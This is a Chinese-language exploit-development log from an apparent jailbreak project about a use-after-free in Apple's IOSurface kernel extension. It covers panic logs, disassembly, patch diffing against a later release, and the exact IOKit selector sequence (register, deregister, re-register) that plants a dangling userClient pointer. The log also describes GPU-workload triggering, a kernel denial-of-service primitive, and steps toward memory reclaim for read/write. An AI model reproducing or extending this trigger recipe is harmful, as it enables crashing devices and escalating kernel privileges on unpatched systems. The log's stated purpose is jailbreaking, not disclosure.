# S2 突破：IOSurface 已注销对象 UAF（27.0.1）

> README（24 行）
> 1. **本项目第一个确定性内核内存破坏证据（崩溃本身 5/5，但可复现性未成立，见第 2 条）**。 **5/5 panic**，同一条指令 `0xfffffe000a34ff88`。
> 2. ⚠ **可复现性未成立。** 5 次命中全部集中在 12:11–12:30 那段设备状态。此后用**同样的 `postclose` + `lockdeg`** 在冷启动下真执行两次（tag `D`，时间戳已核验非跳过记录），**均不命中**。触发对设备前期状态有依赖，机制未知。**不写「确定性」，也不写「漂移率」（无分母）。**
> 2b. **踩雷机制已静态确认**：`0xa3338cc` 是**释放链遍历**——从正在释放的对象出发沿 `+0x378` 走，只对**引用计数归零**的元素调用 `0xa3462f0(global,0,elem)`，后者才遍历 `root+0x188` 并解引用**每个节点**的 `owner(+0x58)`。⇒ **踩雷发生在「最后一个引用释放」时，不发生在创建时。**（因此 `IOSurfaceCreate` 打流不是踩雷手段，该实验已叫停。）
> 2c. **当前主假设（种雷 = 注销后重注册）**：注销入口 `0xa34b2dc` 开局就 `ldrb [+0xf0]` 判门、随后 `sturb wzr,[+0xf0]` 自清；门一旦为 0，**整段跳过、连 `#802` 摘链一起跳**。而析构 `0xa34373c` 也清 `+0xf0`。⇒ **`+0xf0` 在注销前被清 ⇒ 节点永久留在链表、`+0x58` 悬空。** 27.2 的 `+0xf1` 恰好禁止「已注销对象再注册」⇒ **27.0.1 的 bug 就是注销→重注册成功。** 待验三步：`sel17 注册 → sel18 注销 → sel17 再注册`，看第 3 步是否返回 `SUCCESS`（27.2 会返回 `0xE00002D8`）。
> 2d. **已被证伪的旧假设**：① `postclose` 种雷 —— 其 `rc2/rc3 = MIG_BAD_ARGUMENTS`，调用未进注册函数，**从未插过节点**；② 缺第二持引用进程 —— `dualF` 双引用倒序释放 60/60 阴性，证明「正常 register→正常 release→归零遍历」这条路径**自洽、不种雷**。
> 2e. **字段更正（重要）**：`node+0x58` 是 **`IOSurfaceRootUserClient`（连接对象）**，**不是** IOSurface。依据 `0xa346188 stp x8,x21,[x24,#0x50]`，`x21 = x3` = sel17 传入的 userClient；`sel18` 的匹配条件同为 `*(structureInput+8)==node+0x20 && userClient==node+0x58`。⇒ **故障对象是一个已被释放的用户客户端**，`+0xd8` 是它的锁。**因此「连接关掉、userClient 被释放、节点仍指着它」重新成为主嫌疑**，此前因字段误判被过早排除。
> 2f. **selector 契约（实测+静态）**：`sel17` 注册**需要** async reference（`args+0x10` 非空），`sel18` 注销**不需要**（只读 `args+0x30`），可同步调用。返回码：注册成功 `0`、重复 `0xE00002C9`；注销成功 `0`、未命中 `0xE00002C2`。
> 3. 5 次独立启动、5 个不同 slide、反推静态 pc/lr 全部一致（`0xa34ff88` / `0xa346338`）。
> 4. 性质是 `Kernel tag check fault`：指针 tag 与内存 tag 不符 ⇒ **UAF / 类型混淆**，不是空指针。
> 5. **Apple 在 27.2 修了**：`+0xf1` 粘滞「已注销」标志位。27.0.1 零访问，27.2 恰好两处访问（已独立复核）。27.2 的 `strb w8,[x20,#0xf1]` 位于注销函数 `0xa394744` 的 +0x30（函数开头），27.0.1 同位置为空。
> 6. **种雷与踩雷分离**：崩溃任务一次都不是我们的 App（`avconferenced` / `kernel_task`），两条独立入口汇聚到同一故障点 —— 设备全局、跨进程。
> 7. **种雷条件已找到**：虚 `free()` 清零 `+0xf0` ⇒ teardown `#802` 的门 `tbz w8,#0` 早退 ⇒ 节点永不摘除（见 §4.5）。但**实测枢轴是 `postclose` + `lockdeg` 相邻共存**，单跑任一者皆不炸。
> 8. **UAF 读已静态确认**：`0xa34f8cc` 在 `0xa34f954` / `0xa34f97c` 两次解引用由陈旧 `+0x108`/`+0x110` 算出的指针，全部边界检查都对着陈旧 count 做，等于无约束。
> 9. **回收成功的新判据**：读到的东西要过 PAC（`autda`，判别子 `0xf69b`），失败是 `brk #0xc472`。**崩溃签名变成 `brk 0xc472` ⇒ 回收成功且 base 受控。**
> 10. 原始日志 `out/panics/*.ips`（6 份）；详细过程 `out/IOSURFACE-RACE.md`（456 行）；冻结复现器 `out/POC-isurface-uaf.md`。
> 12. **未完成**：回收控制、可复现性、卡死点定位。见 §5。
> 13. **选择子契约见 §12**：`sel17` 注册需异步 + `structureInput` 精确 24B；`sel18` 注销同步即可，`scalarIn=0`、`structIn=24`、`structOut=0`。
> 14. **重注册路径实测成立**（`sel17→sel18→sel17` 三步全 SUCCESS，见 §12.1）；`sel18` 必须**同步**调用，async 会被 IOKit 前置校验挡成 `0xC2`。
> 15. `+0xf0`/`+0xf1` 在 **userClient** 上（见 §12.2）⇒ 攻击目标是连接对象生命周期。
> 16. **三个核心函数（0xa34b2dc / 0xa3338cc / #802）全镜像零引用（含 PAC 掩码）⇒ 是 KPI 导出**，被别的 kext 经启动时填充的 GOT 调用。⇒ 用户态 `CFRelease` 很可能不触发释放链遍历，必须借 IOGPUFamily（Metal）。见 §12.4。
> 17. **变体 1 强阴性**（种雷三步成功、lookup 40/40 非空、归零释放已发生，仍不崩）⇒ 踩雷方式不是用户态释放路径。见 §12.5。
> 18. 轮 3 改为「提交真实 GPU 工作」逼 IOGPUFamily 走 KPI，并强制取证 dev/tex/status 四项。见 §12.6。
> 19. 纪律见 `out/TOOLING-PITFALLS.md`。

---

## 1. 崩溃事实（机器可读）

```
panic-full-2026-11-01-121105.0002.ips
panic-full-2026-11-01-121203.0002.ips
panic-full-2026-11-01-121622.0002.ips
panic-full-2026-11-01-121754.0002.ips
```

| 项 | 值 |
|---|---|
| 崩溃类型 | `Kernel tag check fault` |
| 未滑动 pc | `0xfffffe000a34ff88`（4/4 一致） |
| 未滑动 lr | `0xfffffe000a346338`（4/4 一致） |
| slide 无关偏移 | `caller − pc = 0x10E5270`（4/4 一致） |
| 所属 kext | `com.apple.iokit.IOSurface` |
| 内核 | `Darwin 27.0.0 xnu-13432.2.10~2 RELEASE_ARM64_T8150`，`24A446` |

### 故障指令

```
0xa34ff48  bti c ; pacibsp
0xa34ff74  mov  x22, x0                 ; self
0xa34ff88  ldr  x0, [x0, #0xd8]         ; ★ 故障点
0xa34ff8c  bl   0xa359e3c               ; 上锁（stub → 内核例程）
0xa34ff94  mov  x0, x22
0xa34ff98  mov  x1, x20                 ; value
0xa34ff9c  bl   0xa34f8cc               ; 数组追加/索引
```

### tag 不符的直接证据

```
x0  = 0xf8fffe2ea528a120
far = 0xf6fffe2ea528a1f8
far − x0 = 0xd8               ← 正好是访问的字段偏移
tag: 0xf8 → 0xf6              ← 指针带旧 tag 访问新 tag 的内存
```

指针来自 `node+0x58`（`0xa346324 ldr x0,[x22,#0x58]`），即**注册表节点持有的 owner**。

---

## 2. 触发链：**种雷与踩雷分离**（两条独立入口，已验证）

**崩溃任务一次都不是我们的 App。**

| 时间 | 崩溃任务 | pid | slide |
|---|---|---|---|
| 12:11:05 | `avconferenced` | 878 | `0x3e48c000` |
| 12:12:03 | `kernel_task` | 0 | `0x2eb20000` |
| 12:16:22 | `kernel_task` | 0 | `0x4686c000` |
| 12:17:54 | `kernel_task` | 0 | `0x2f420000` |

### 入口 A（panic #1，avconferenced，用户 syscall 路径）

```
0xa34ff88  IOSurface   ← 故障
0xa346338  IOSurface
0xa3339e4  IOSurface   ← 共同前缀
0xa34d5c8  IOSurface
0xb383900  com.apple.kernel
...        com.apple.kernel
0x15ac00f18  用户态
```

### 入口 B（panic #2/#3/#4，kernel_task，GPU workloop）

```
0xa34ff88  IOSurface   ← 故障
0xa346338  IOSurface
0xa3339e4  IOSurface   ← 共同前缀
0xa337204  IOSurface
0xa351bc4  IOSurface
0xa02b0e0  IOUGPUFamily
0xa03acec  IOUGPUFamily
0x84f768c  AGXG18P
0x84f85ac  AGXG18P
```

### 结论

**不是「关连接时炸」，是「注册表里有颗地雷，谁踩都一样」。**

- 某个序列**种下**一个指向已释放对象的节点（`node+0x58` = dead owner）
- 之后**任何**遍历注册表的代码都会炸：GPU workloop 会踩，`avconferenced` 调个 syscall 也会踩
- 所以炸的永远是别人，**不是种雷的进程**

**这让 bug 更值钱**：设备全局、跨进程、不需要攻击者在线就能引爆。

### 内部链路（`bl` 调用者唯一，无分叉）

```
0xa3338cc
  └─ 0xa3462f0   遍历 root+0x188
       ldr x0,[x20,#0x150] ; bl lock
       ldr x22,[x20,#0x188]   ; head
       ldr x0,[x22,#0x58]     ; ★ node->owner（已释放）
       bl 0xa34ff4c           ; lr = 0xa346338
          └─ 0xa34ff88 ldr x0,[x0,#0xd8]   ← 炸
```

`0xa34ff48` 调用者唯一 `0xa346334`；`0xa3462f0` 调用者唯一 `0xa3339e0`。

**入口是虚派发**：`0xa34d5c8` / `0xa351bc4` / `0xa337204` 的 `bl` 调用者**全部为 0**，且**不在任何 selector handler 表里** ⇒ IOSurface 的 C++ 虚函数，vtable 间接调用。

---

## 2.5 归因定案：`postclose` + `lockdeg` 必须相邻共存

决定性实验：全新 tag 强制重跑 panic 时刻那份完整计划，**12:30:30 崩**（`kernel_task`，slide `0x4c2e4000`，pc/lr 同点）。归因不是那套共用 bundle id 的 fuzz harness —— 结案。

九次运行的因果表：

| 含 `postclose` | 含 `lockdeg` | 结果 |
|---|---|---|
| ✔ | ✔ | **5/5 全崩**（12:11 / 12:12 / 12:16 / 12:17 / 12:30） |
| ✘ | ✔ | 0（lockdeg 单跑 1000 次） |
| ✔ | ✘ | 0（postclose 单跑 40 次，观察 93 s） |
| ✘ | ✘ | 0（big 单跑 12 次） |

**单跑任一者都不炸 ⇒ 必须相邻共存。** 枢轴不是 `IOServiceClose` 本身，而是 **「额外 uref 让它活过 close」那一步**。

崩溃前进度只到：

```
baselineC 4 / doubleC 4 / postcloseC 6 / lockdegC 183（begin 无 end）
DANGLING: lockdegC-N1-I0183
```

`surfchC` / `bigC` / `race8C` / `race1C` 一条都没开始 ⇒ **进程在第 183 次迭代内卡死在内核调用里**，主线程阻塞到连 `@summary` 都写不出，3 秒后 GPU workloop 遍历注册表踩雷。

**独立结论**：这个缺陷的**第一表现是内核卡死，第二表现才是 panic**。卡死的合理解释是 `bl 0xa359e3c` 在已释放对象里的锁指针上做获取，撞上被重新分配的锁字 —— 即成死锁。**即使不 panic，这已经是一个确定性内核拒绝服务原语**，PoC 价值独立于 UAF 利用。

---



## 3. 27.0.1 → 27.2 差分（**独立复核**）

全 kext `__TEXT_EXEC` 内 `ldrb/strb [x,#0xf1]` 计数（排除 `movk #0xf19c` 这类 PAC 判别子）：

| 版本 | 计数 | 指令 |
|---|---|---|
| **27.0.1** | **0** | 13 个 `#0xf1x` 命中全是 `movk #0xf19c` / `add #0xf14,#0xf19,#0xf17`（字符串偏移） |
| **27.2** | **2** | `0xa394500 ldrb w8,[x21,#0xf1]`（检查）· `0xa394774 strb w8,[x20,#0xf1]`（置位） |

27.0.1 侧另确认：

- `0xa3460f0`（注册）：遍历 `root+0x188`，比较 `node+0x20` 与 `x22[8]`、`node+0x58` 与 `x21`，**全程无 `+0xf1` 检查**
- `0xa346364`（注销）：同样无

**结论**：Apple 在 27.2 给 IOSurface 对象加了粘滞「已注销」标志位，注销时置位、注册时检查（返回 `0xE00002D8`）。这是 Apple 自己认定生命周期 bug 的指纹。

---

## 4. 潜在原语

`0xa34f8cc` 内部：

```
ldr w9, [x0, #0x110]      ; count ← 已释放对象的字段
ldr x8, [x0, #0x108]      ; base  ← 已释放对象的字段
add x10, x8, x9, lsl #3   ; base + count*8
eor x16, x8, x10
tst x16, #-0x40000000000000
movk x10, #0xc8a2, lsl #48   ; 溢出/tag 检查失败毒值
```

**更正（收回曾经的过度声称）**：`0xa34f8cc` **不是**裸 `base + idx`，它带边界检查：

```
0xa34f8e4  cmp w9,w1 ; b.ls out     ; idx < count 检查
0xa34f8f4  eor x16,x8,x10 ; tst x16,#-0x40000000000000
0xa34f900  movk x10,#0xc8a2,lsl#48  ; 范围/tag 一致性校验
```

所以「任意地址读写」**证据不足**。现实风险是：`base`/`count` 来自**已释放内存**，边界检查对着垃圾值做，之后解引用的是**陈旧 base 指针** —— 定性是 **UAF 读**，不是干净任意地址。

让它变成可控原语的唯一一道门是**回收控制**（用同 zone 对象抢占那块已释放内存并写入内容）。本轮**未验证**。

---

## 4.5 确定性种雷条件（**不需要竞态**）

### 字段图（按类分开，勿混用）

**类 B：buffer-holding 对象**（析构 `0xa34373c`）

```
+0xd0  base1（指针）      +0xd8  count1（32 位）
+0xe8  base2（指针）      +0xf0  count2（32 位，低字节被 teardown 当门用）
```

**类 A：注册表节点的 owner**（故障点所在）

```
+0xd8  锁指针（← 故障点 ldr x0,[x0,#0xd8] 后紧跟 bl 0xa359e3c 拿锁）
```

### `free()` 会清掉 teardown 的门

```
0xa34373c（析构，唯一调用者 0xa34368c，位于 0xa343448 = 虚 free()，bl 调用者 0）
  ldr  x1,[x0,#0xd0] ; ldr w8,[x0,#0xd8] ; lsl x2,x8,#3
  bl   0xa359e0c                 ; 释放 base1
  ldr  x20,[x0,#0xe8] ; ldr w21,[x0,#0xf0] ; lsl x1,x21,#3
  bl   0xa359dec                 ; 释放 base2
  str  xzr,[x19,#0xd0] ; str wzr,[x19,#0xd8]
  str  xzr,[x19,#0xe8] ; str wzr,[x19,#0xf0]   ; ★ 清零
```

teardown `#802` 的门：

```
ldrb w8,[x0,#0xf0] ; tbz w8,#0 -> tail     ; 读 +0xf0 低字节
```

**⇒ 虚 `free()` 一旦在 `#802` 之前跑，`#802` 读到 0 就整段早退，节点永不摘除，`node+0x58` 悬空。**

**完全确定性，无竞态。** 这也解释了 27.2 为何把标志放在 `+0xf1`：`+0xf0` 会被析构清零，标志必须放在能活过清零的位置。

### 待验证的最小序列

```
IOServiceOpen(IOSurfaceRoot, type 0) → sel 17 async 注册 → IOSurfaceCreate
→ CFRelease(s)（只放用户引用，不关连接）→ 触发一次注册表遍历
```

遍历入口：入口 A `IOSurfaceLock`/`Unlock`（`0xa34d5c8`）或入口 B Metal 压 GPU（`0xa351bc4`）。

---



## 5. 未闭环（不填空白）

1. **回收控制未测**。不知道 stale 对象的 zone 能否被用户态分配抢占。**这是「只能崩」到「能读」的唯一瓶颈。**
2. **最小序列未确认**。已知枢轴是 `postclose`（额外 uref 让对象活过 close）+ `lockdeg` **相邻共存**；单跑任一者都不炸。更小的组合未找。
3. **卡死点未定位**。进程在第 183 次迭代内阻塞在内核调用里，具体卡在哪个 selector 未查明。
4. `0xa3462f0` 的入口 selector 号未对出。它是虚派发（`bl` 调用者为 0，不在任何 selector 表里）。
5. selector 18（按键注销）异步形态未测。27.2 **没有**给它加 `+0xf1` 检查，理论上该支路在 27.2 仍开放。
6. 「27.0.1 teardown 把 `#802` 放最后、27.2 提到最前」这半边是子代理的静态判定，**未经我独立复核**。

---

## 6. 对越狱链的意义

**S2 这一环从「零原语」变成「有一个确定性 UAF」。** 但如实说：

- 这**不改变 S5 的结论**。签名验证在 TXM，内核 UAF 到不了「跑未签名代码」。
- 它的实际价值是：**一个可复现、有官方修复指纹的内核内存破坏 PoC**。这是本项目目前最硬的产出。
- 从 UAF 到 r/w 还需要回收控制 + 类型布局，是独立的一大步。

---

## §12 IOSurfaceRoot 选择子契约（从真实派发表解出）

派发表：`0xfffffe000837fa10`，stride 40。27.2 对应表 `0xfffffe00083962c0`。

```
sel  handler            scalarIn  structIn  scalarOut  structOut  async?  reads
 17  0xfffffe000a3498f4     0        24        0          0       YES   asyncWakeTarget,structureInput
 18  0xfffffe000a34991c     0        24        0          0        -    structureInput
 19  0xfffffe000a349934     0   variable    0          0        -    structureInput,structureInputSize
 24  0xfffffe000a349b48     0   variable    0          0        -    structureInput,structureInputSize
```

- **`sel17` 注册**：handler `0xa3498f4` → `b 0xa3460f0(root, asyncRef, structureInput, userClient)`。
  **必须异步**（`ldr x1,[args+0x10] ; cbz x1 -> 0xE00002C2`）。
- **`sel18` 注销**：handler `0xa34991c` → `b 0xa3461f4(root, structureInput, userClient)`。
  **同步即可**（只读 `args+0x30`），但 `structureInputSize` 必须**精确 24**、`scalarInputCount` 必须 **0**。
- `structIn=24` 的只有 17 和 18 ⇒ **注销选择子不会再认错**。

匹配条件（两函数相同）：
```
*(u64*)(structureInput+8) == node+0x20      // key
userClient                == node+0x58      // owner
```

返回码：
```
register   成功 -> 0           重复 -> 0xE00002C9  (= 0xE00002BD + 0xC)
deregister 成功 -> 0           未命中 -> 0xE00002C2
```

**待验的四数字诊断**（同一连接、同一次运行）：
`sel17#1 / sel17#2(须 0xC9) / sel18 / sel17#3` —— 可唯一区分「节点不存在」与「sel18 找不到」。

### §12.1 重注册路径实测成立（本轮）

`seq4I`，20/20 完全一致：

```
sel17 #1 = 0x0          SUCCESS
sel17 #2 = 0xE00002C9   dup（证明 key+client 命中已存在节点）
sel18    = 0x0          ★ 注销成功
sel17 #3 = 0x0          ★ 27.0.1 允许「注销后再注册」
```

**这是本项目第一个与 27.2 补丁一一对应的实测可触发路径**（27.2 在注销时置 `+0xf1=1`，注册时检查并返回 `0xE00002D8`）。

**纠错记录**：此前 `sel18` 一直返回 `0xE00002C2`，原因不是「注销路径不通」，而是**调用形态错误** —— 一律用 `IOConnectCallAsyncMethod` 打一个**同步**方法，被 IOKit 前置校验挡回，handler 从未执行。改为同步后一次通过。

### §12.2 `+0xf0` / `+0xf1` 位于 **userClient** 上（静态确认）

```
0xa34b384  ldr x0,[x20,#0xe8]     ; root
0xa34b388  mov x1,x20             ; self = 传入对象本身
0xa34b38c  bl  0xa346364          ; #802(root, self) —— 摘 node+0x58 == self 的节点
```
register 存的是 `node+0x58 = userClient` ⇒ **`0xa34b2dc` 的参数就是 userClient**，`+0xf0`（拆除门）与 `+0xf1`（27.2 粘滞标志）都在**连接对象**上。

⇒ **攻击目标是 userClient 的生命周期，不是 surface 的字段。**

### §12.3 `+0xf1` 补丁点确认：在 `#802` 上，不在 `sel18` 上

27.2 `0xa394744`（= 27.0.1 `#802` 的对应体）反汇编：

```
0xa394760  mov  x20,x1            ; 只取两参数：x0=root, x1=self
0xa394768  ldr  x0,[x0,#0x150]    ; lock
0xa394770  mov  w8,#1
0xa394774  strb w8,[x20,#0xf1]    ; ★ 函数最开头打永久标记
0xa394778  ldr  x21,[x19,#0x188]  ; 遍历
0xa39478c  ldr  x8,[x21,#0x58] ; cmp x8,x20   ; 摘 node+0x58 == self 的节点
```

27.0.1 的 `sel18` 目标是三参数 `(root, structureInput, client)`，形态不同。⇒ **补丁语义 = 「拆除 client 时打永久标记，之后禁止再注册」。**

### §12.4 三个核心函数在全镜像零引用 ⇒ 它们是 **KPI 导出**

```
0xa34b2dc 拆除入口     bl 调用者=0   数据槽=0（含 PAC 掩码）
0xa3338cc 释放链遍历   bl 调用者=0   数据槽=0（含 PAC 掩码）
0xa346364 #802         bl 调用者=0   数据槽=0（含 PAC 掩码）
```

连 PAC 掩码（低 48 位比较）后仍为零 ⇒ 不是本 kext 内的 vtable 引用，而是**被别的 kext 经启动时填充的 GOT 槽调用**（`adrp/add/ldr x16/braa` stub，槽构建时为 0）。

**两个直接推论：**
1. **用户态 `CFRelease(surface)` 很可能根本不调用 `0xa3338cc`** —— 释放链遍历是给 GPU 用的 KPI。⇒ 「引用归零即遍历」这个模型不完整，必须由 **IOGPUFamily 那条路径**来调。
2. **历史上 5 次里 4 次崩在 GPU workloop**（`0xa337204 → 0xa351bc4 ← 0xa02b0e0 IOUGPUFamily ← AGXG18P`）—— 那才是真正的踩雷入口。

⇒ **新的踩雷方案（变体 3）**：把 surface 交给 `MTLDevice newTextureWithIOSurface:` 再释放，逼 IOGPUFamily 走 KPI 拆除路径。

### §12.5 变体 1 强阴性（缺口已补）

`replant2K1`，冷启动后 40/40：

```
rc0 注册        = 0x0  ×40   SUCCESS
rc1 注销        = 0x0  ×40   SUCCESS
rc2 再注册      = 0x0  ×40   SUCCESS
rc3 lookup 非空 = 1    ×40   ★ 第二个引用确实拿到
rc4 gid         = 8 / 5      真实 ID
begin=40 end=40  dangling=[]  panic=5（无新增）
```

**「种雷三步成功 + client 已 close + 第二引用非空 + 归零释放已发生」全部成立，仍不崩。**

结合 §12.4 ⇒ **踩雷方式不是用户态释放路径**，`0xa3338cc` 根本未被调用。这是当前最强的单条阴性。

### §12.6 轮 3 设计：必须提交 GPU 工作，不能只建 texture

历史 4 次 GPU 崩溃栈为 AGXG18P workloop 在跑 ⇒ 必须有**真实 GPU 工作**才会走到 `0xa351bc4 → 0xa3338cc`。只 `newTexture` 不提交可能什么都不发生。

```
sel17 → sel18 → sel17                       种雷
dev = MTLCreateSystemDefaultDevice()         ★ 取证非 NULL，否则本轮无效
desc.iosurface = s ; tex = newTexture...     ★ 取证非 NULL
blit copyFromTexture:tex toTexture:tex2 ; commit ; waitUntilCompleted   ★ 取证 status
release tex ; CFRelease(s) ; CFRelease(s2)
```

**四个取证值必须齐全（dev/tex/tex2/cmd status）** —— 与 §12.5 补的缺口同型，防止把「Metal 不可用」误判成「阴性」。

**轮 2（不 close）已砍掉**：client 不释放 + 用户态不调踩雷函数，两个必要条件都不满足，必然是零信息阴性。
